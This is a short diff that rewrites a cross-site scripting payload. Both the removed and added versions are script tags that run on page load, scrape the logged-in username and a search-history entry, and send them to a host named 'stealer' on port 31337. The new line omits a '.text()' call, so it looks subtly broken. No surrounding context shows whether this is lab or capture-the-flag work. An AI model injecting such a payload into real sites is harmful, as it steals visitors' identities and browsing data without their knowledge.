@@ -1,1 +1,1 @@
-<script>     $(document).ready(function() {         var asciiname = $(`#logged-in-user`).text();         var last_history = $(`#history-list a:nth-child(2)`).text();         var url = `http://stealer:31337/?stolen_user=` + asciiname + `&last_search=` + last_history;         $.get(url, {user:asciiname, search:last_history});     }) </script>
+<script>     $(document).ready(function() { $.get(`http://stealer:31337/?stolen_user=` + $(`#logged-in-user`).text() + `&last_search=` + $(`#history-list a:nth-child(2)`))     }) </script>
